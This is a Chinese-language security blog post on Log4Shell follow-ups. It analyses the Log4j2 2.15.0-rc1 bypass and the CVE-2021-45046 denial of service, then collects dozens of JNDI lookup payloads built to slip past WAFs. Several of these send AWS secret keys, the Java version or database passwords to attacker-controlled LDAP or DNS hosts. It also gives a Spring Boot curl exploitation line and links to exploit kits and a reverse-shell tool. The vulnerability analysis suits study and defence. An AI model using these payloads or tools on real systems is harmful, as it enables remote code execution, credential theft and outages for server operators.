# log4jshell的后续



### 0x00 写在前面

> 该文章为《[CVE-2021-44428 | 对 Apache Log4jshell 的深入学习与思考](./CVE-2021-44228-Apache-Log4jshell的深入思考)》的后续内容，主要谈论log4j2 RC1、RC2、CVE-2021-45046、绕过方式和其他涉及应用等杂项内容，文章部分内容来源于网络和个人整理总结。



### 0x01 RC1版本的绕过与利用

修复版本`2.15.0-rc1`

跟了下流程发现到`PatternLayout.toSerializable`方法发生了变化

不过这里的变化没有什么影响，其中的`formatters`属性的变化导致了`${}`不会被处理

```java
@Override
public StringBuilder toSerializable(final LogEvent event, final StringBuilder buffer) {
    for (PatternFormatter formatter : formatters) {
        formatter.format(event, buffer);
    }
    return buffer;
}
```

上一篇文章提到这里某个`formatter`包含了`MessagePatternConverter`

在修复后变成了`MessagePatternConverter.SimplePatternConverter`类

![img](../assets/2021-12-15-Log4jshell%E5%90%8E%E7%BB%AD/0119.png)

可以发现在这个类中变成了直接拼接字符串的操作，不去判断`${}`这种情况

```java
private static final class SimpleMessagePatternConverter extends MessagePatternConverter {
    private static final MessagePatternConverter INSTANCE = new SimpleMessagePatternConverter();
    @Override
    public void format(final LogEvent event, final StringBuilder toAppendTo) {
        Message msg = event.getMessage();
        // 直接拼接字符串
        if (msg instanceof StringBuilderFormattable) {
            ((StringBuilderFormattable) msg).formatTo(toAppendTo);
        } else if (msg != null) {
            toAppendTo.append(msg.getFormattedMessage());
        }
    }
}
```

注意到另一个子类`LookupMessagePatternConverter`

如果`Converter`被设置为该类，那么会继续进行`${}`的处理

```java
private static final class LookupMessagePatternConverter extends MessagePatternConverter {
    private final MessagePatternConverter delegate;
    private final Configuration config;

    LookupMessagePatternConverter(final MessagePatternConverter delegate, final Configuration config) {
        this.delegate = delegate;
        this.config = config;
    }

    @Override
    public void format(final LogEvent event, final StringBuilder toAppendTo) {
        int start = toAppendTo.length();
        delegate.format(event, toAppendTo);
        // 判断${}
        int indexOfSubstitution = toAppendTo.indexOf("${", start);
        if (indexOfSubstitution >= 0) {
            config.getStrSubstitutor()
                // 进入了上文的流程
                .replaceIn(event, toAppendTo, indexOfSubstitution, toAppendTo.length() - indexOfSubstitution);
        }
    }
}
```

具体需要设置为哪一个子类取决于用户的配置

```java
private static final String LOOKUPS = "lookups";
private static final String NOLOOKUPS = "nolookups";

public static MessagePatternConverter newInstance(final Configuration config, final String[] options) {
    boolean lookups = loadLookups(options);
    String[] formats = withoutLookupOptions(options);
    TextRenderer textRenderer = loadMessageRenderer(formats);
    // 默认不配置lookup功能
    MessagePatternConverter result = formats == null || formats.length == 0
        ? SimpleMessagePatternConverter.INSTANCE
        : new FormattedMessagePatternConverter(formats);
    if (lookups && config != null) {
        // 只有用户进行配置才会触发
        result = new LookupMessagePatternConverter(result, config);
    }
    if (textRenderer != null) {
        result = new RenderingPatternConverter(result, textRenderer);
    }
    return result;
}
```

于是想办法开启`lookup`功能分析后续有没有限制

```java
final Configuration config = new DefaultConfigurationBuilder().build(true);
// 配置开启lookup功能
final MessagePatternConverter converter =
    MessagePatternConverter.newInstance(config, new String[] {"lookups"});
final Message msg = new ParameterizedMessage("${jndi:ldap://127.0.0.1:1389/badClassName}");
final LogEvent event = Log4jLogEvent.newBuilder()
    .setLoggerName("MyLogger")
    .setLevel(Level.DEBUG)
    .setMessage(msg).build();
final StringBuilder sb = new StringBuilder();
converter.format(event, sb);
System.out.println(sb);
```

成功开启`lookups`功能，调用`LookupMessagePatternConverter.fomat`方法

![img](../assets/2021-12-15-Log4jshell%E5%90%8E%E7%BB%AD/0120.png)

递归处理等过程均没有变化，最后`JndiManager.lookup`触发漏洞的地方进行了修改

```java
public synchronized <T> T lookup(final String name) throws NamingException {
    try {
        URI uri = new URI(name);
        if (uri.getScheme() != null) {
            // 允许的协议白名单
            if (!allowedProtocols.contains(uri.getScheme().toLowerCase(Locale.ROOT))) {
                LOGGER.warn("Log4j JNDI does not allow protocol {}", uri.getScheme());
                return null;
            }
            if (LDAP.equalsIgnoreCase(uri.getScheme()) || LDAPS.equalsIgnoreCase(uri.getScheme())) {
                // 允许的host白名单
                if (!allowedHosts.contains(uri.getHost())) {
                    LOGGER.warn("Attempt to access ldap server not in allowed list");
                    return null;
                }
                Attributes attributes = this.context.getAttributes(name);
                if (attributes != null) {
                    Map<String, Attribute> attributeMap = new HashMap<>();
                    NamingEnumeration<? extends Attribute> enumeration = attributes.getAll();
                    while (enumeration.hasMore()) {
                        Attribute attribute = enumeration.next();
                        attributeMap.put(attribute.getID(), attribute);
                    }
                    Attribute classNameAttr = attributeMap.get(CLASS_NAME);
                    // 参考下图我们这种Payload不存在javaSerializedData头
                    // 所以不会进入类白名单判断
                    if (attributeMap.get(SERIALIZED_DATA) != null) {
                        if (classNameAttr != null) {
                            // 类名白名单
                            String className = classNameAttr.get().toString();
                            if (!allowedClasses.contains(className)) {
                                LOGGER.warn("Deserialization of {} is not allowed", className);
                                return null;
                            }
                        } else {
                            LOGGER.warn("No class name provided for {}", name);
                            return null;
                        }
                    } else if (attributeMap.get(REFERENCE_ADDRESS) != null
                               || attributeMap.get(OBJECT_FACTORY) != null) {
                        // 不允许REFERENCE这种加载对象的方式
                        LOGGER.warn("Referenceable class is not allowed for {}", name);
                        return null;
                    }
                }
            }
        }
    } catch (URISyntaxException ex) {
        // This is OK.
    }
    return (T) this.context.lookup(name);
}
```

看看实际运行中，这几个白名单是怎样的

![img](../assets/2021-12-15-Log4jshell%E5%90%8E%E7%BB%AD/0121.png)

默认的协议是：`java`，`ldap`，`ldaps`

默认数据类型是八大基本数据类型

默认的Host白名单是`localhost`

实际上拦住`Payload`是在最后一处`OBJECT_FACTORY`判断

![img](../assets/2021-12-15-Log4jshell%E5%90%8E%E7%BB%AD/0122.png)

由于RCE一定需要加载远程对象，那么避免不了`javaFactory`属性（或者有一些其他思路，笔者刚做Java安全不了解）

看起来无懈可击，然而这里有一处细节问题

```java
public synchronized <T> T lookup(final String name) throws NamingException {
    try {
        URI uri = new URI(name);
        ...
    } catch (URISyntaxException ex) {
        // This is OK.
    }
    return (T) this.context.lookup(name);
}
```

如果发生了`URISyntaxException`异常会直接`this.context.lookup`

能否想办法让`new URI(name);`时候报错但`name`传入`context.lookup(name);`时正常

经过测试发现`URI`中不进行`URL`编码会报这个错，加个空格即可触发`${jndi:ldap://127.0.0.1:1389/ badClassName}`（`不对空格做编码`导致异常，但是`lookup`时候会去掉这个空格）

![img](../assets/2021-12-15-Log4jshell%E5%90%8E%E7%BB%AD/0123.png)

成功RCE（需要用户开启`lookup`功能的基础上才可以）

![img](../assets/2021-12-15-Log4jshell%E5%90%8E%E7%BB%AD/0124.png)



### 0x02 RC2版本的利用

修复版本`2.15.0-rc2`

RC2的修复方案是直接return，有效解决了上文的绕过

```java
try{
} catch (URISyntaxException ex) {
    LOGGER.warn("Invalid JNDI URI - {}", name);
    return null;
}
return (T) this.context.lookup(name);
```

但后来某国外团队提交了`CVE-2021-45046`漏洞报告，该漏洞可造成拒绝服务攻击（DDOS）

在`2.15.0`版本利用的前提：该漏洞必须在开启`lookup`功能的情况下触发

一种常见的开启姿势是在`log4j2.xml`中：

```java
<appenders>
    <console name="CONSOLE-APPENDER" target="SYSTEM_OUT">
        <PatternLayout pattern="%msg{lookups}%n"/>
    </console>
</appenders>
```



[4ra1n](https://xz.aliyun.com/u/44415)的**挖掘过程**

回顾`RC1`和`RC2`的修复：如果存在`JndiLookup`那么会判断其中的的`host`是否合法

```java
if (!allowedHosts.contains(uri.getHost())) {
    LOGGER.warn("Attempt to access ldap server not in allowed list");
    return null;
}
```



而`allowedHosts`中一定包含有`localhost`和`127.0.0.1`

```java
// 拿到本地IP
private static final List<String> permanentAllowedHosts = NetUtils.getLocalIps();
...
addAll(hosts, allowedHosts, permanentAllowedHosts, ALLOWED_HOSTS, data);
return new JndiManager(...,allowedHosts,...);
```

这说明如果`LDAP`服务端在`127.0.0.1`可以成功`lookup`

然而黑客不可能凭空在服务端本地开启一个恶意的`LDAP Server`

想到`lookup`本质是网络相关的操作，会有阻塞的可能。可以构造出`Payload`使程序`lookup`本地，而本地不可能开`LDAP Server`，于是发生超时等待，也许会有拒绝服务漏洞的可能

于是修改了`RC2`的源码，加入了统计时间代码，分析`lookup`的超时情况

（下文分析为什么阻塞的方法不是`lookup`而是`context.getAttributes`）

```java
if (!allowedHosts.contains(uri.getHost())) {
    LOGGER.warn("Attempt to access ldap server not in allowed list");
    return null;
}
long startTime = System.currentTimeMillis();
Attributes attributes = null;
try {
    // 阻塞方法
    attributes = this.context.getAttributes(name);
}catch (Exception ignored){
}
long endTime = System.currentTimeMillis();
System.out.println(endTime-startTime);
```

测试以上打印时间的代码会发现总是打印`2000`左右，说明超时时间为`2`秒

深入`getAttributes`可以看到这样的方法

```java
static ResolveResult getUsingURLIgnoreRootDN(String var0, Hashtable<?, ?> var1) throws NamingException {
    LdapURL var2 = new LdapURL(var0);
    // 跟入
    LdapCtx var3 = new LdapCtx("", var2.getHost(), var2.getPort(), var1, var2.useSsl());
    String var4 = var2.getDN() != null ? var2.getDN() : "";
    CompositeName var5 = new CompositeName();
    if (!"".equals(var4)) {
        var5.add(var4);
    }

    return new ResolveResult(var3, var5);
}
```

在new LdapCtx方法中存在connect操作导致阻塞

（其实connect方法还有几步才会到达最底层的阻塞，不过没有必要继续分析了

```java
public LdapCtx(String var1, String var2, int var3, Hashtable<?, ?> var4, boolean var5) throws NamingException {
    ...
    try {
        this.connect(false);
    }
    ...
}
```

回到之前的问题：为什么阻塞的不是`lookup`而是`getAttributes`方法

当前代码在连接超时后会抛出异常，走不到`lookup`方法

![img](../assets/2021-12-15-Log4jshell%E5%90%8E%E7%BB%AD/0137.png)

其实在`lookup`方法中应该也会造成阻塞，简单往里面跟一下会发现类似的代码

```java
// 从Attributes里获取属性
// 那么应该调用了getAttributes之类的阻塞方法
if (((Attributes)var4).get(Obj.JAVA_ATTRIBUTES[2]) != null) {
    var3 = Obj.decodeObject((Attributes)var4);
}

if (var3 == null) {
    // 类似的代码
    var3 = new LdapCtx(this, this.fullyQualifiedName(var1));
}
```

现在发现了能让程序阻塞的办法，那么怎样构造`Payload`以达成更长时间的阻塞呢

`Log4j2`在处理`${}`是递归解析，也就是说会处理一个字符串中的所有`${}`并分别处理对应的值，每一次的处理都会造成`2`秒的等待，所以只需简单的拼接即可

```java
private int substitute(final LogEvent event, final StringBuilder buf, final int offset, final int length,
                       List<String> priorVariables) {
    ...
    substitute(event, bufName, 0, bufName.length());
    ...
    String varValue = resolveVariable(event, varName, buf, startPos, endPos);
    ...
    int change = substitute(event, buf, startPos, varLen, priorVariables);
}
```

例如拼接三个会阻塞更长的时间

（这里是针对本地`80`端口，实际上可以用大概率关闭的高位端口）

```poc
${jndi:ldap://127.0.0.1}${jndi:ldap://127.0.0.1}${jndi:ldap://127.0.0.1}
```

这时候会产生疑问:

在一个`web`请求中，这样的`payload`只能让我当前的请求阻塞住，如何实现真正的拒绝服务攻击，让目标网站无法正常处理别人的请求呢？



**利用**

**通常情况下，记录登录用户的身份等信息是常见的操作**

如果程序员选择了`Log4j2`这种`ctx`记录的方式而不是手动拼接字符串，将会导致该漏洞

```java
@RequestMapping("/test")
@ResponseBody
public String test(String userId) {
    try {
        String id = new String(Base64.getDecoder().decode(userId));
        // 记录用户登录ID
        ThreadContext.put("loginId", id);
        // 记录该用户已登录
        logger.info("user login");
        // 其他业务逻辑
        // ...
    } catch (Exception e) {
        return e.getMessage();
    }
    return "";
}
```

正常情况下：`http://localhost:8080/test?userId=MQ==`

将会记录

```
2021-12-15 12:51:27,845 [http-nio-8080-exec-1] 1 user login
```

如果打`Payload`则报错并成功阻塞

```
http://localhost:8080/test?userId=JHtqbmRpOmxkYXA6Ly8xMjcuMC4wLjF9
```

改写下`Python`脚本即可成功拒绝服务

```python
url = "http://127.0.0.1:8080/test?userId=" + str(payload, encoding="utf-8")
```



**CVE分析**

在`Log4j2.xml`中支持一种配置从上下文中取值：例如这个例子可以取到`loginId`值

```XML
<Appenders>
    <Console name="STDOUT" target="SYSTEM_OUT">
        <PatternLayout>
            <pattern>%d %p %c{1.} [%t] $${ctx:loginId} %m%n</pattern>
        </PatternLayout>
    </Console>
</Appenders>
```

如果程序这样写

```java
public static void main(String[] args) throws Exception{
    ThreadContext.put("loginId","1}");
    logger.error("xxx");
}
```

将会打印

```
2021-12-15 12:03:53,860 ERROR Main [main] 1 xxx
```

如果代码这样写将会导致类似的拒绝服务

```java
ThreadContext.put("loginId","${jndi:ldap://127.0.0.1}");
logger.error("xxx");
```

在`xml`中有另一种效果相同的配置方式，但这种写法反而不会触发`${}`解析

```xml
<Appenders>
    <Console name="STDOUT" target="SYSTEM_OUT">
        <PatternLayout>
            <pattern>%d %p %c{1.} [%t] %X{loginId} %m%n</pattern>
        </PatternLayout>
    </Console>
</Appenders>
```

关于拒绝服务的分析上文已有，重点看一下`ContextMapLookup`

```java
@Override
public String lookup(final String key) {
    return currentContextData().getValue(key);
}

@Override
public String lookup(final LogEvent event, final String key) {
    return event.getContextData().getValue(key);
}
```

这里的`contextData`正是一个简单的`Map`

![img](../assets/2021-12-15-Log4jshell%E5%90%8E%E7%BB%AD/0139.png)

在`resolveVariable`方法返回

```java
protected String resolveVariable(final LogEvent event, final String variableName, final StringBuilder buf,
                                 final int startPos, final int endPos) {
    final StrLookup resolver = getVariableResolver();
    if (resolver == null) {
        return null;
    }
    // 取出了${jndi:ldap://127.0.0.1}
    return resolver.lookup(event, variableName);
}
```

取出的`payload`在下一次的递归中成功被`lookup`

![img](../assets/2021-12-15-Log4jshell%E5%90%8E%E7%BB%AD/0140.png)

不难发现`lookup`时是从`event`中取`Map`那么该`Map`是如何保存到`event`中的呢

定位到创建`LogEvent`的方法`ReusableLogEventFactory.createEvent`

```java
@Override
public LogEvent createEvent(final String loggerName, final Marker marker, final String fqcn,
                            final StackTraceElement location, final Level level, final Message message,
                            final List<Property> properties, final Throwable t) {
    if (result == null || result.reserved) {
        final boolean initThreadLocal = result == null;
        // 这个类中包含了空的context
        result = new MutableLogEvent();
        ...
    }
    ...
    // 真正设置context属性
    result.setContextData(injector.injectContextData(properties, (StringMap) result.getContextData()));
    result.setContextStack(ThreadContext.getDepth() == 0 ? ThreadContext.EMPTY_STACK : ThreadContext.cloneStack());
    ...
    return result;
}
```

跟入`ThreadContextDataInjector.injectContextData`方法

```java
@Override
public StringMap injectContextData(final List<Property> props, final StringMap ignore) {
    if (providers.size() == 1 && (props == null || props.isEmpty())) {
        // 跟入supplyStringMap
        return providers.get(0).supplyStringMap();
    }
    ...
}
```

进入`ThreadContextDataProvider.supplyStringMap`方法

```java
@Override
public StringMap supplyStringMap() {
    return ThreadContext.getThreadContextMap().getReadOnlyContextData();
}
```

在`getReadOnlyContextData`中获得这个`Map`

![img](../assets/2021-12-15-Log4jshell%E5%90%8E%E7%BB%AD/0141.png)



### 0x03 bypass

> 基础payload:${jndi:ldap://somesitehackerofhell.com/z}



#### 1. 系统环境变量值绕过

```
${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//somesitehackerofhell.com/z}
```

来自 Apache Log4j 2 文档：`${env:ENV_NAME:-default_value}`

如果没有 ENV_NAME 系统环境变量，请在后面使用文本：`-`

`攻击者可以使用任何名称代替 ENV_NAME，但它必须不存在。`

或者黑客可以读取环境变量，例如 AWS_SECRET_ACCESS_KEY：

```
${jndi:ldap://somesitehackerofhell.com/z?leak=${env:AWS_SECRET_ACCESS_KEY:-NO_EXISTS}}
```

更多秘密环境变量:https://github.com/OneBitSec/awesome-list-of-secrets-in-environment-variables



#### 2.Lower | Upper大小写绕过

```
${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://somesitehackerofhell.com/z}
${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://somesitehackerofhell.com/z}
```

`${lower:<text>}`会将目标转换为小写

`${upper:<text>}`会将目标转换为大写



#### 3. "::-"符号

```
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::- a}${::-p}://somesitehackerofhell.com/z}
```



#### 4.无效的Unicode字符与大写

```
${jnd${upper:ı}:ldap://somesitehackerofhell.com/z}
```

无效的Unicode字符`ı` 将转换为字母`i` (toUpperCase转换)



#### 5.系统属性

```
${jnd${sys:SYS_NAME:-i}:ldap:/somesitehackerofhell.com/z}
```

如果没有 SYS_NAME 系统属性，请使用以下文本：-

#### 6. ":-"符号

```
${j${${:-l}${:-o}${:-w}${:-e}${:-r}:n}di:ldap://somesitehackerofhell.com/z}
```



#### 7.日期型

```
${${date:'j'}${date:'n'}${date:'d'}${date:'i'}:${date:'l'}${date:'d' }${date:'a'}${date:'p'}://somesitehackerofhell.com/z}
```

Java 日期格式会将 'YYYY' 转换为类似2022这种日期型格式，也会将 'j' 转换为 j



#### 8.HTML URL编码

将字符替换为：

- } : %7D
- { : %7B
- $ : %24



#### 9.不存在的lookup

```
${${what:ever:-j}${some:thing:-n}${other:thing:-d}${and:last:-i}:ldap://somesitehackerofhell.com/z}
```

随便什么，只要键值不存在



#### 10.多态（JSON REST API 请求）

```json
{
    "one-${jnd${a":"a:-i}:ld${",
    "two":"o:-a}p://somesitehackerofhell.com/z}
}
```

单独的这些键和值并不代表攻击。但它们加在一起就是攻击，由于 JSON 解析器，这种攻击对检测系统是透明的。[详细](https://d0znpp.medium.com/bypassing-ngfw-wafs-using-data-format-obfuscations-188351ea9e73)

#### 11. Unicode 字符（JSON REST API 请求）

```
${\u006a\u006e\u0064\u0069:ldap://somesitehackerofhell.com/z}
```

将一些字符转换为 unicode 即可



#### 12.使用 # （log4j 2.15版本）

```
${jndi:ldap://127.0.0.1#somesitehackerofhell.com/z}
```

在 Log4J 2.15.0 中绕过 allowedLdapHost 和 allowedClasses 检查。 java.net.URI getHost() 方法返回 # 之前的值作为真实主机。但是 JNDI/LDAP 解析器将解析为尝试连接到恶意 LDAP 服务器的完整主机名字符串。[详细](https://twitter.com/marcioalm/status/1471742744347348997)



#### 13. DOS攻击(log4j 2.8 - 2.16 - CVE-2021-45105)

```
https://d0znpp.medium.com/bypassing-ngfw-wafs-using-data-format-obfuscations-188351ea9e73
```



#### 14.PDF

制作特殊的 pdf 文件以利用 CVE-2021-44228

![PDF example](../assets/2021-12-15-Log4jshell%E5%90%8E%E7%BB%AD/147821759-3532d8f8-2378-4405-a333-e56d8e7e7a8a.png)

**以上内容来自 `https://github.com/Puliczek/CVE-2021-44228-PoC-log4j-bypass-words` **



#### 其他的一些bypass方法

```json
${lower:${🅰️d:-${lower:}}jndi:}

${jndi:ldap://attacker.com/a}

${j${upper:${lower:n}}di:ldap://attacker.com/a}

${${date:'j'}${date:'n'}${date:'d'}${date:'i'}:ldap://attacker.com/a}

${${env:BARFOO:-j}Ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attacker.com/a}

${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://127.0.0.1:1389/ass}

${${::-j}ndi:rmi://127.0.0.1:1389/ass}

${jndi:rmi://a.b.c}

${${lower:jndi}:${lower:rmi}://q.w.e/poc}

${${lower:${lower:jndi}}:${lower:rmi}://a.s.d/poc}

${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://l}

${${::-j}ndi:rmi://}

${${lower:jndi}:${lower:rmi}://}

${${lower:${lower:jndi}}:${lower:rmi}://

${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}:}

${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://asdasd.asdasd.asdasd/poc}

${${::-j}ndi:rmi://asdasd.asdasd.asdasd/ass}

${jndi:rmi://adsasd.asdasd.asdasd}

${${lower:jndi}:${lower:rmi}://adsasd.asdasd.asdasd/poc}

${${lower:${lower:jndi}}:${lower:rmi}://adsasd.asdasd.asdasd/poc}

${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://adsasd.asdasd.asdasd/poc}

${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://xxxxxxx.xx/poc}

${j${upper:n:-}di:ldap://example.com:1389

${j${k8s:k5:-ND}i${sd:k5:-:}ldap://kjhkjhkjh}

${j${main:\k5:-Nd}i${spring:k5:-:}ldap://kjhkjhkjh}

${j${sys:k5:-nD}${lower:i${web:k5:-:}}ldap://kjhkjhkjh}

${j${::-nD}i${::-:}ldap://kjhkjhkjh}

${j${EnV:K5:-nD}i:ldap://kjhkjhkjh}

${j${loWer:Nd}i${uPper::}ldap}

${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:l}dap${env:NaN:-:}//your.burpcollaborator.net/a}

${${upper:}jndi:ldap://example.com/a}

${j${upper::-n}di:ldap://example.com:1389/a}

${"£$_"£🅰️d:-${lower:j}n}di:

${🅰️d:-${lower:}j}ndi:

${🅰️d:-${lower:j}n}di:

#Akamai Bypass Log4j
${jndi${123%25ff:-}:ldap://HOST:PORT/a}

#Amazon AWS WAf Bypass
${j${k8s:k5:-ND}i${sd:k5:-:}ldap://HOST:PORT/a}

${jnd${123%25ff:-${123%25ff:-i:}}ldap://HOST:PORT/a}
${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//dnslog.cn/a}
${jndi:ldap://127.0.0.1:1389/ badClassName}
```



#### 一些获取信息的payload

```
#目标java版本
${jndi:ldap://${sys:java.version}.dnslog.cn}
```

![图片](../assets/2021-12-15-Log4jshell%E5%90%8E%E7%BB%AD/FGT0Im-UcAIq7IA.png)

#### JSON bypass ${

```json
{"key":"\u0024\u007b"}
or
{"key":"\x24\u007b"}
```



#### sys、env bypass

```
#sys
System.getProperty()

#env
System.getenv()
```



#### 0x04 `ResourceBundleLookup`配合log4j获取敏感信息

```java

public String lookup(final LogEvent event, final String key) {
    if (key == null) {
        return null;
    }
    final String[] keys = key.split(":");
    final int keyLen = keys.length;
    if (keyLen != 2) {
        LOGGER.warn(LOOKUP, "Bad ResourceBundle key format [{}]. Expected format is BundleName:KeyName.", key);
        return null;
    }
    final String bundleName = keys[0];
    final String bundleKey = keys[1];
    try {
        // The ResourceBundle class caches bundles, no need to cache here.
        return ResourceBundle.getBundle(bundleName).getString(bundleKey);
    } catch (final MissingResourceException e) {
        LOGGER.warn(LOOKUP, "Error looking up ResourceBundle [{}].", bundleName, e);
        return null;
    }
}
```

从代码上来看就很好理解，把 key 按照 : 分割成两份，第一个是 bundleName 获取 ResourceBundle，第二个是 bundleKey 获取 Properties Value

ResourceBundle 在 Java 应用开发中经常被用来做国际化，网站通常会给一段表述的内容翻译成多种语言，比如中文简体、中文繁体、英文。

那开发者可能就会使用 ResourceBundle 来分别加载 classpath 下的 zh_CN.properties、en_US.properties。并按照唯一的 key 取出对应的那段文字。例如： **zh_CN.properties**

```
LOGIN_SUCCESS=登录成功
```

那 `ResourceBundle.getBundle("zh_CN").getString("LOGIN_SUCCESS")` 获取到的就是 `登录成功`

如果系统是 springboot 的话，它会有一个 application.properties 配置文件。里面存放着这个系统的各项配置，其中有可能就包含 redis、mysql 的配置项。当然也不止 springboot，很多其他类型的系统也会写一些类似 jdbc.properties 的文件来存放配置。

这些 properties 文件都可以通过 ResourceBundle 来获取到里面的配置项。所以在 log4j 中 Bundle 是比sys和env更严重的存在。

payload:

```java
${bundle:application:spring.datasource.password}
ldap://127.0.0.1/${bundle:application:spring.datasource.password}
dns://127.0.0.1/${bundle:application:spring.datasource.password}
```

![图片](../assets/2021-12-15-Log4jshell%E5%90%8E%E7%BB%AD/640.webp)





#### 0x05 受影响列表



汇总:

https://gist.github.com/N0b1ta/d67a41b5582c9315d4148eebb3b3b39e

https://mvnrepository.com/artifact/log4j/log4j/usages

https://github.com/YfryTchsGD/Log4jAttackSurface





CISCO受影响产品

https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-apache-log4j-qRuKNEbd#vp



#### 0x06  一些主要产品的利用方式

##### Spring Boot

```
curl <target ip:port> -H "X-Api-Version":{payload}

https://www.youtube.com/watch?v=pyY-1jX7Wg4
```



会陆续添加至[bitwiki](https://wiki.1bit.win/doc/)



#### 0x07 推荐工具

payload 生成器 : https://github.com/woodpecker-appstore/log4j-payload-generator

PDF log4j2利用 ：https://github.com/eelyvy/log4jshell-pdf

支持log4j2的反向shell : https://github.com/H0j3n/EzpzShell 

一些平台的payload ： https://github.com/OneBitSec/CVE-2021-44228-Log4j-Payloads

poc.java : https://github.com/OneBitSec/apache-log4j-rce-poc

JNDI 漏洞利用工具包 ： https://github.com/pimps/JNDI-Exploit-Kit

漏洞利用扩展：https://github.com/OneBitSec/Log4j2-CVE-2021-44228

通过用户浏览器间接利用内部网络资源 ：https://blog.olliejc.uk/2021/12/12/log4shell-could-be-exploited-from-your-network/
